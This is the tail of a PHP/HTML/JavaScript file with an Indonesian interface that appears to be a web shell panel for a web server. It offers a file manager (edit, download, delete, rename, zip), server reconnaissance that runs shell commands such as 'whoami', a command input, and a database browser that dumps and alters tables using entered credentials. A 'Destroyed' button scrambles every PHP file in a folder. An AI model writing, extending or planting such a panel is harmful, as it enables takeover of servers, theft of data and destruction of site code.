                    <button type="submit" class="btn"><i class="fa-solid fa-search"></i> Cari</button>
                    <?php if ($fileSearch !== ''): ?>
                        <a href="?dir=<?php echo urlencode($dir); ?>" class="btn btn-secondary"><i class="fa-solid fa-xmark"></i> Reset</a>
                    <?php endif; ?>
                </form>
                <form method="post" class="file-action-form" onsubmit="return confirmDestroyAllPhp(this);">
                    <input type="hidden" name="destroy_all_php_confirm" value="">
                    <button type="submit" class="btn btn-red" style="white-space:nowrap;"><i class="fa-solid fa-burst"></i> Destroyed</button>
                </form>
                <span class="file-tools-hint"><i class="fa-solid fa-box-archive"></i> Arsipkan berkas/folder atau ekstrak ZIP dari kolom aksi.</span>
            </div>

            <table>
                <tr>
                    <th>Nama Berkas / Folder</th>
                    <th>Tipe</th>
                    <th>Ukuran</th>
                    <th>Izin (Chmod)</th>
                    <th>Aksi</th>
                </tr>
                <tr>
                    <td><a href="?dir=<?php echo urlencode(dirname($dir)); ?>" style="display:flex; align-items:center; gap:10px;"><i class="fa-solid fa-arrow-turn-up"></i> .. (Kembali)</a></td>
                    <td>Folder</td>
                    <td>-</td>
                    <td>-</td>
                    <td>-</td>
                </tr>
                <?php
                $files = scandir($dir);
                foreach ($files as $file) {
                    if ($file === '.' || $file === '..') continue;
                    if ($fileSearch !== '' && stripos($file, $fileSearch) === false) continue;
                    $filePath = $dir . DIRECTORY_SEPARATOR . $file;
                    $safeFile = htmlspecialchars($file, ENT_QUOTES, 'UTF-8');
                    $isDir = is_dir($filePath);
                    $permissionBits = fileperms($filePath);
                    $perms = $permissionBits !== false ? substr(sprintf('%o', $permissionBits), -4) : '????';
                    $canWrite = is_writable($filePath);
                    $permissionClass = $permissionBits === false ? 'permission-unknown' : ($canWrite ? 'permission-writable' : 'permission-readonly');
                    $permissionTitle = $permissionBits === false ? 'Izin tidak dapat dibaca' : ($canWrite ? 'Dapat ditulis oleh proses PHP' : 'Tidak dapat ditulis oleh proses PHP');
                    $permissionIcon = $permissionBits === false ? 'fa-circle-question' : ($canWrite ? 'fa-pen' : 'fa-lock');
                    $size = $isDir ? '-' : number_format(filesize($filePath)) . ' B';
                    
                    echo "<tr>";
                    if ($isDir) {
                        echo "<td><a href='?dir=" . urlencode($filePath) . "' style='display:flex; align-items:center; gap:10px;'><i class='fa-solid fa-folder' style='color:#fbbf24;'></i> $safeFile</a></td><td>Folder</td><td>$size</td><td><span class='permission-badge $permissionClass' title='$permissionTitle'><i class='fa-solid $permissionIcon'></i> $perms</span></td>";
                        echo "<td><div class='actions-group'>";
                        echo "<form method='post' class='file-action-form' onsubmit='return confirmArchiveFile(this);'><input type='hidden' name='file_action' value='archive'><input type='hidden' name='file_name' value='$safeFile'><button type='submit' class='btn icon-action' title='Arsipkan folder' aria-label='Arsipkan folder $safeFile'><i class='fa-solid fa-box-archive'></i></button></form>";
                        echo "</div></td>";
                    } else {
                        echo "<td><div style='display:flex; align-items:center; gap:10px;'><i class='fa-solid fa-file-lines' style='color:#60a5fa;'></i> $safeFile</div></td><td>File</td><td>$size</td><td><span class='permission-badge $permissionClass' title='$permissionTitle'><i class='fa-solid $permissionIcon'></i> $perms</span></td>";
                        echo "<td><div class='actions-group'>";
                        $downloadHref = '?dir=' . urlencode($dir) . '&download=' . urlencode($file);
                        $editHref = '?dir=' . urlencode($dir) . '&edit=' . urlencode($filePath);
                        echo "<a href='" . htmlspecialchars($downloadHref, ENT_QUOTES, 'UTF-8') . "' class='btn icon-action' title='Download file' aria-label='Download file $safeFile'><i class='fa-solid fa-download'></i></a>";
                        echo "<a href='" . htmlspecialchars($editHref, ENT_QUOTES, 'UTF-8') . "' class='btn icon-action' title='Edit file' aria-label='Edit file $safeFile'><i class='fa-solid fa-pen-to-square'></i></a>";
                        echo "<form method='post' class='file-action-form' onsubmit='return confirmDeleteFile(this);'>";
                        echo "<input type='hidden' name='file_action' value='delete'><input type='hidden' name='file_name' value='$safeFile'>";
                        echo "<button type='submit' class='btn icon-action icon-action-delete' title='Hapus file' aria-label='Hapus file $safeFile'><i class='fa-solid fa-trash-can'></i></button></form>";
                        echo "<form method='post' class='file-action-form'>";
                        echo "<input type='hidden' name='file_action' value='rename'><input type='hidden' name='file_name' value='$safeFile'><input type='hidden' name='new_name' value=''>";
                        echo "<button type='button' class='btn icon-action icon-action-rename' title='Rename file' aria-label='Rename file $safeFile' onclick='renameFile(this.form)'><i class='fa-solid fa-file-signature'></i></button></form>";
                        echo "<form method='post' class='file-action-form' onsubmit='return confirmArchiveFile(this);'><input type='hidden' name='file_action' value='archive'><input type='hidden' name='file_name' value='$safeFile'><button type='submit' class='btn icon-action icon-action-archive' title='Arsipkan file' aria-label='Arsipkan file $safeFile'><i class='fa-solid fa-box-archive'></i></button></form>";
                        if (strtolower(pathinfo($file, PATHINFO_EXTENSION)) === 'zip') {
                            echo "<form method='post' class='file-action-form' onsubmit='return confirmExtractFile(this);'><input type='hidden' name='file_action' value='extract'><input type='hidden' name='file_name' value='$safeFile'><button type='submit' class='btn icon-action icon-action-extract' title='Ekstrak ZIP' aria-label='Ekstrak ZIP $safeFile'><i class='fa-solid fa-file-zipper'></i></button></form>";
                        }
                        echo "</div></td>";
                    }
                    echo "</tr>";
                }
                ?>
            </table>
        </div>

        <!-- INFORMASI SERVER -->
        <div class="card" id="serverInfoCard">
            <h3><i class="fa-solid fa-server"></i> Informasi Spesifikasi Server</h3>
            <table>
                <tr><td style="width: 25%;"><b>Host Name</b></td><td><?php echo $_SERVER['SERVER_NAME']; ?></td></tr>
                <tr><td><b>Server IP</b></td><td><?php echo $_SERVER['SERVER_ADDR'] ?? 'Tidak terdeteksi'; ?></td></tr>
                <tr><td><b>Web Server</b></td><td><?php echo $_SERVER['SERVER_SOFTWARE']; ?></td></tr>
                <tr><td><b>Versi PHP</b></td><td><?php echo phpversion(); ?></td></tr>
                <tr><td><b>User Web Server</b></td><td><?php echo run_cmd('whoami'); ?></td></tr>
                <tr><td><b>Document Root</b></td><td><?php echo $_SERVER['DOCUMENT_ROOT']; ?></td></tr>
                <tr><td><b>Upload Limits</b></td><td>upload_max: <?php echo ini_get('upload_max_filesize'); ?> | post_max: <?php echo ini_get('post_max_size'); ?></td></tr>
                <tr><td><b>OS Server</b></td><td><?php echo php_uname(); ?></td></tr>
            </table>
        </div>
    </div>

    <div class="app-modal-backdrop" id="appModal" aria-hidden="true">
        <section class="app-modal" role="dialog" aria-modal="true" aria-labelledby="appModalTitle" aria-describedby="appModalMessage">
            <div class="app-modal-heading">
                <span class="app-modal-icon" id="appModalIcon"><i class="fa-solid fa-circle-question"></i></span>
                <h2 class="app-modal-title" id="appModalTitle">Konfirmasi</h2>
            </div>
            <p class="app-modal-message" id="appModalMessage"></p>
            <label class="app-modal-input-label" id="appModalInputLabel" for="appModalInput" hidden>Nama file baru</label>
            <input class="app-modal-input" id="appModalInput" type="text" autocomplete="off" hidden>
            <div class="app-modal-footer">
                <button type="button" class="btn btn-secondary" id="appModalCancel">Batal</button>
                <button type="button" class="btn app-modal-confirm" id="appModalConfirm">Lanjutkan</button>
            </div>
        </section>
    </div>

    <script>
        let currentColumnsData = [];

        const databaseManagerCard = document.getElementById('databaseManagerCard');
        const serverInfoCard = document.getElementById('serverInfoCard');
        if (databaseManagerCard && serverInfoCard) {
            const databasePosition = document.createComment('database-card-position');
            const serverPosition = document.createComment('server-card-position');
            databaseManagerCard.replaceWith(databasePosition);
            serverInfoCard.replaceWith(serverPosition);
            databasePosition.replaceWith(serverInfoCard);
            serverPosition.replaceWith(databaseManagerCard);
        }

        let appModalAction = null;

        const appModal = document.getElementById('appModal');
        const appModalTitle = document.getElementById('appModalTitle');
        const appModalMessage = document.getElementById('appModalMessage');
        const appModalIcon = document.getElementById('appModalIcon');
        const appModalInput = document.getElementById('appModalInput');
        const appModalInputLabel = document.getElementById('appModalInputLabel');
        const appModalConfirm = document.getElementById('appModalConfirm');

        function openAppModal(options) {
            appModalAction = options.onConfirm;
            appModalTitle.textContent = options.title;
            appModalMessage.textContent = options.message;
            appModalIcon.innerHTML = `<i class="fa-solid ${options.icon || 'fa-circle-question'}"></i>`;
            appModalIcon.classList.toggle('is-danger', Boolean(options.danger));
            appModalConfirm.textContent = options.confirmText || 'Lanjutkan';
            appModalConfirm.classList.toggle('is-danger', Boolean(options.danger));

            const hasInput = Object.prototype.hasOwnProperty.call(options, 'inputValue');
            appModalInput.hidden = !hasInput;
            appModalInputLabel.hidden = !hasInput;
            if (hasInput) {
                appModalInput.value = options.inputValue;
                appModalInputLabel.textContent = options.inputLabel || 'Nama file baru';
            }

            appModal.classList.add('is-open');
            appModal.setAttribute('aria-hidden', 'false');
            document.body.style.overflow = 'hidden';
            (hasInput ? appModalInput : appModalConfirm).focus();
            if (hasInput) appModalInput.select();
        }

        function closeAppModal() {
            appModal.classList.remove('is-open');
            appModal.setAttribute('aria-hidden', 'true');
            document.body.style.overflow = '';
            appModalAction = null;
        }

        function confirmAppModal() {
            if (!appModalAction) return closeAppModal();
            const shouldClose = appModalAction(appModalInput.value);
            if (shouldClose !== false) closeAppModal();
        }

        document.getElementById('appModalCancel').addEventListener('click', closeAppModal);
        appModalConfirm.addEventListener('click', confirmAppModal);
        appModal.addEventListener('click', event => {
            if (event.target === appModal) closeAppModal();
        });
        document.addEventListener('keydown', event => {
            if (!appModal.classList.contains('is-open')) return;
            if (event.key === 'Escape') closeAppModal();
            if (event.key === 'Enter' && event.target === appModalInput) confirmAppModal();
        });

        function confirmDeleteFile(form) {
            openAppModal({
                title: 'Hapus file?',
                message: 'File yang dihapus tidak dapat dipulihkan. Yakin ingin melanjutkan?',
                icon: 'fa-trash-can',
                confirmText: 'Ya, hapus file',
                danger: true,
                onConfirm: () => form.submit()
            });
            return false;
        }

        function confirmDestroyAllPhp(form) {
            openAppModal({
                title: 'Hancurkan semua file PHP di folder ini?',
                message: 'Isi semua file PHP di folder ini akan diacak, lalu nama file dan ekstensinya diganti dengan teks/simbol acak. Aplikasi biasa ikut terdampak; subfolder tidak. Ketik HANCURKAN SEMUA untuk melanjutkan.',
                icon: 'fa-burst',
                confirmText: 'Hancurkan semua',
                danger: true,
                inputValue: '',
                inputLabel: 'Ketik HANCURKAN SEMUA untuk konfirmasi',
                onConfirm: confirmation => {
                    if (confirmation.trim() !== 'HANCURKAN SEMUA') {
                        appModalMessage.textContent = 'Konfirmasi salah. Ketik HANCURKAN SEMUA persis untuk melanjutkan.';
                        appModalInput.focus();
                        return false;
                    }
                    form.elements.destroy_all_php_confirm.value = 'HANCURKAN SEMUA';
                    form.submit();
                }
            });
            return false;
        }

        function confirmArchiveFile(form) {
            const fileName = form.elements.file_name.value;
            openAppModal({
                title: 'Buat arsip ZIP?',
                message: `Buat arsip ZIP dari "${fileName}" di direktori aktif?`,
                icon: 'fa-box-archive',
                confirmText: 'Arsipkan',
                onConfirm: () => form.submit()
            });
            return false;
        }

        function confirmExtractFile(form) {
            const fileName = form.elements.file_name.value;
            openAppModal({
                title: 'Ekstrak arsip?',
                message: `Ekstrak isi "${fileName}" ke folder baru di direktori aktif?`,
                icon: 'fa-file-zipper',
                confirmText: 'Ekstrak',
                onConfirm: () => form.submit()
            });
            return false;
        }

        function renameFile(form) {
            const currentName = form.elements.file_name.value;
            openAppModal({
                title: 'Ubah nama file',
                message: 'Masukkan nama baru untuk file ini.',
                icon: 'fa-file-signature',
                confirmText: 'Simpan nama',
                inputValue: currentName,
                onConfirm: newName => {
                    const trimmedName = newName.trim();
                    if (!trimmedName) {
                        appModalMessage.textContent = 'Nama file tidak boleh kosong.';
                        appModalInput.focus();
                        return false;
                    }
                    form.elements.new_name.value = trimmedName;
                    form.submit();
                }
            });
        }

        function setCmd(cmd) {
            document.querySelector('input[name="command"]').value = cmd;
        }

        function exportDatabaseJson() {
            const form = document.createElement('form');
            form.method = 'POST';
            form.action = window.location.href;
            form.style.display = 'none';

            const fields = {
                db_action: 'export_json',
                db_conn: document.getElementById('db_conn').value,
                db_host: document.getElementById('db_host').value,
                db_port: document.getElementById('db_port').value,
                db_name: document.getElementById('db_name').value,
                db_user: document.getElementById('db_user').value,
                db_pass: document.getElementById('db_pass').value
            };

            Object.entries(fields).forEach(([name, value]) => {
                const input = document.createElement('input');
                input.type = 'hidden';
                input.name = name;
                input.value = value;
                form.appendChild(input);
            });

            document.body.appendChild(form);
            form.submit();
            setTimeout(() => form.remove(), 1000);
        }

        async function dbAction(action, extraData = {}) {
            const statusEl = document.getElementById('dbStatus');
            const outEl = document.getElementById('dbOut');
            
            statusEl.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Memproses...';
            if (action !== 'browse' && action !== 'delete' && action !== 'insert') {
                outEl.textContent = 'Memuat data server...';
            }

            const formData = new URLSearchParams();
            formData.append('db_action', action);
            formData.append('db_conn', document.getElementById('db_conn').value);
            formData.append('db_host', document.getElementById('db_host').value);
            formData.append('db_port', document.getElementById('db_port').value);
            formData.append('db_name', document.getElementById('db_name').value);
            formData.append('db_user', document.getElementById('db_user').value);
            formData.append('db_pass', document.getElementById('db_pass').value);

            for (const key in extraData) {
                formData.append(key, extraData[key]);
            }

            try {
                const response = await fetch(window.location.href, {
                    method: 'POST',
                    body: formData
                });
                const res = await response.json();
                
                if (!res.ok) {
                    statusEl.innerHTML = '<i class="fa-solid fa-circle-xmark" style="color:#ef4444;"></i> Gagal';
                    outEl.textContent = 'ERROR: ' + res.error;
                    return;
                }

                statusEl.innerHTML = '<i class="fa-solid fa-circle-check" style="color:#10b981;"></i> Terhubung Sempurna';
                if (action === 'test') {
                    outEl.textContent = res.message;
                } else if (action === 'tables') {
                    if (res.tables.length === 0) {
                        outEl.textContent = 'Database terhubung, tetapi belum ada tabel di dalamnya.';
                        return;
                    }
                    
                    outEl.innerHTML = '<div style="margin-bottom:12px; font-weight:600; color:#cbd5e1; display:flex; align-items:center; gap:8px;"><i class="fa-solid fa-list-check"></i> Daftar Tabel (Klik untuk buka):</div>' +
                        '<img src="https://i.pinimg.com/1200x/0f/d2/fc/0fd2fc1c6630d0bd3ca6be9209f3f31f.jpg" ' +
                        'alt="Ilustrasi" ' +
                        'style="display:block; width:min(100%, 380px); aspect-ratio:16 / 9; object-fit:cover; margin:12px 0; border-radius:var(--radius-md); border: 1px solid var(--border-subtle); box-shadow: 0 8px 24px rgba(0,0,0,0.5);">' +
                        '<div id="tableBadgeContainer" style="margin-top:12px; display:flex; flex-wrap:wrap; gap:8px;"></div>';
                    const container = document.getElementById('tableBadgeContainer');
                    
                    res.tables.forEach(t => {
                        const badge = document.createElement('span');
                        badge.className = 'table-list-badge';
                        badge.innerHTML = '<i class="fa-solid fa-database" style="color:var(--primary);"></i> ' + t;
                        badge.onclick = () => dbAction('browse', { db_table: t });
                        container.appendChild(badge);
                    });
                } else if (action === 'browse') {
                    let table = res.table;
                    currentColumnsData = res.columns;
                    let rows = res.rows;
                    let pk = res.primary_key;

                    outEl.innerHTML = '';

                    const topDiv = document.createElement('div');
                    topDiv.style.cssText = 'display:flex; justify-content:space-between; align-items:center; margin-bottom:14px; flex-wrap:wrap; gap:10px;';
                    
                    const infoSpan = document.createElement('span');
                    infoSpan.style.fontSize = '0.9rem';
                    infoSpan.innerHTML = `<i class="fa-solid fa-table"></i> <b>Tabel:</b> <span style="color:#60a5fa;">${table}</span> (${res.count} baris aktif)`;

                    const actionGroup = document.createElement('div');
                    actionGroup.className = 'db-table-actions';

                    const btnBack = document.createElement('button');
                    btnBack.type = 'button';
                    btnBack.className = 'btn btn-secondary';
                    btnBack.innerHTML = '<i class="fa-solid fa-arrow-left"></i> Kembali ke Daftar Tabel';
                    btnBack.onclick = () => dbAction('tables');
                    
                    const btnAdd = document.createElement('button');
                    btnAdd.type = 'button';
                    btnAdd.className = 'btn btn-green';
                    btnAdd.innerHTML = '<i class="fa-solid fa-plus"></i> Tambah Data';
                    btnAdd.onclick = () => showInsertForm(table);

                    actionGroup.appendChild(btnBack);
                    actionGroup.appendChild(btnAdd);
                    topDiv.appendChild(infoSpan);
                    topDiv.appendChild(actionGroup);
                    outEl.appendChild(topDiv);

                    if (rows.length === 0) {
                        const p = document.createElement('p');
                        p.style.cssText = 'color:var(--text-muted); margin-top:12px; font-size:0.88rem;';
                        p.textContent = 'Tabel ini masih kosong (0 baris).';
                        outEl.appendChild(p);
                    } else {
                        const wrapper = document.createElement('div');
                        wrapper.style.cssText = 'overflow-x:auto; margin-top:12px;';
                        
                        let tableHtml = `<table class="db-table"><tr>`;
                        currentColumnsData.forEach(c => {
                            tableHtml += `<th>${c.Field} <small style="color:var(--text-muted);">(${c.Type})</small></th>`;
                        });
                        if (pk) tableHtml += `<th>Aksi</th>`;
                        tableHtml += `</tr>`;

                        rows.forEach(row => {
                            tableHtml += `<tr>`;
                            currentColumnsData.forEach(c => {
                                let val = row[c.Field];
                                tableHtml += `<td>${val !== null ? escapeHtml(String(val)) : '<span style="color:#ef4444;">NULL</span>'}</td>`;
                            });
                            tableHtml += `</tr>`;
                        });
                        tableHtml += `</table>`;
                        wrapper.innerHTML = tableHtml;
                        outEl.appendChild(wrapper);

                        if (pk) {
                            const trs = outEl.querySelectorAll('table.db-table tr');
                            trs.forEach((tr, index) => {
                                if (index === 0) return;
                                const rowData = rows[index - 1];
                                const tdAction = document.createElement('td');
                                const delBtn = document.createElement('button');
                                delBtn.className = 'btn btn-red';
                                delBtn.style.cssText = 'padding:4px 10px; font-size:0.75rem;';
                                delBtn.innerHTML = '<i class="fa-solid fa-trash"></i> Hapus';
                                delBtn.onclick = () => deleteRow(table, pk, rowData[pk]);
                                tdAction.appendChild(delBtn);
                                tr.appendChild(tdAction);
                            });
                        }
                    }
                } else if (res.message) {
                    outEl.textContent = res.message;
                }
            } catch (e) {
                statusEl.innerHTML = '<i class="fa-solid fa-triangle-exclamation" style="color:#ef4444;"></i> Error';
                outEl.textContent = 'Gagal melakukan request AJAX ke server: ' + e.message;
            }
        }

        function showInsertForm(table) {
            const outEl = document.getElementById('dbOut');
            outEl.innerHTML = '';

            const h4 = document.createElement('h4');
            h4.style.cssText = 'margin-bottom:14px; font-size:1rem; color:var(--text-main); display:flex; align-items:center; gap:8px;';
            h4.innerHTML = `<i class="fa-solid fa-circle-plus"></i> Tambah Data ke Tabel: <span style="color:#60a5fa;">${table}</span>`;
            outEl.appendChild(h4);
            
            const form = document.createElement('form');
            form.id = 'insertForm';
            form.onsubmit = (e) => submitInsert(e, table);

            currentColumnsData.forEach(c => {
                if (c.Extra && c.Extra.includes('auto_increment')) return;
                const div = document.createElement('div');
                div.style.marginBottom = '12px';
                
                const label = document.createElement('label');
                label.style.fontSize = '0.78rem';
                label.textContent = `${c.Field} (${c.Type})`;
                div.appendChild(label);

                const input = document.createElement('input');
                input.type = 'text';
                input.name = `data[${c.Field}]`;
                input.placeholder = `Masukkan nilai ${c.Field}`;
                div.appendChild(input);

                form.appendChild(div);
            });

            const btnContainer = document.createElement('div');
            btnContainer.style.cssText = 'display:flex; gap:12px; margin-top:18px;';

            const submitBtn = document.createElement('button');
            submitBtn.type = 'submit';
            submitBtn.className = 'btn btn-green';
            submitBtn.innerHTML = '<i class="fa-solid fa-floppy-disk"></i> Simpan Data';

            const cancelBtn = document.createElement('button');
            cancelBtn.type = 'button';
            cancelBtn.className = 'btn btn-secondary';
            cancelBtn.innerHTML = '<i class="fa-solid fa-xmark"></i> Batal';
            cancelBtn.onclick = () => dbAction('browse', { db_table: table });

            btnContainer.appendChild(submitBtn);
            btnContainer.appendChild(cancelBtn);
            form.appendChild(btnContainer);
            outEl.appendChild(form);
        }

        async function submitInsert(e, table) {
            e.preventDefault();
            const form = document.getElementById('insertForm');
            const formDataObj = new FormData(form);
            let extra = { db_table: table };
            for (let [key, value] of formDataObj.entries()) {
                extra[key] = value;
            }
            await dbAction('insert', extra);
            dbAction('browse', { db_table: table });
        }

        async function deleteRow(table, pkField, pkValue) {
            openAppModal({
                title: 'Hapus baris data?',
                message: 'Data yang dihapus tidak dapat dipulihkan. Yakin ingin melanjutkan?',
                icon: 'fa-trash-can',
                confirmText: 'Ya, hapus data',
                danger: true,
                onConfirm: async () => {
                    await dbAction('delete', {
                        db_table: table,
                        pk_field: pkField,
                        pk_value: pkValue
                    });
                    dbAction('browse', { db_table: table });
                }
            });
        }

        function escapeHtml(text) {
            return text
                .replace(/&/g, "&amp;")
                .replace(/</g, "&lt;")
                .replace(/>/g, "&gt;")
                .replace(/"/g, "&quot;")
                .replace(/'/g, "&#039;");
        }

        const uploadInput = document.getElementById('uploadFile');
        const uploadDropzone = document.querySelector('.upload-dropzone');
        const uploadFileName = document.getElementById('uploadFileName');

        function updateUploadFileName() {
            const file = uploadInput.files[0];
            uploadFileName.textContent = file ? `Berkas dipilih: ${file.name}` : 'Belum ada berkas dipilih';
        }

        uploadInput.addEventListener('change', updateUploadFileName);
        ['dragenter', 'dragover'].forEach(eventName => {
            uploadDropzone.addEventListener(eventName, event => {
                event.preventDefault();
                uploadDropzone.classList.add('is-dragover');
            });
        });

        ['dragleave', 'drop'].forEach(eventName => {
            uploadDropzone.addEventListener(eventName, event => {
                event.preventDefault();
                uploadDropzone.classList.remove('is-dragover');
            });
        });

        uploadDropzone.addEventListener('drop', event => {
            if (event.dataTransfer.files.length) {
                uploadInput.files = event.dataTransfer.files;
                updateUploadFileName();
            }
        });
    </script>
</body>
</html>
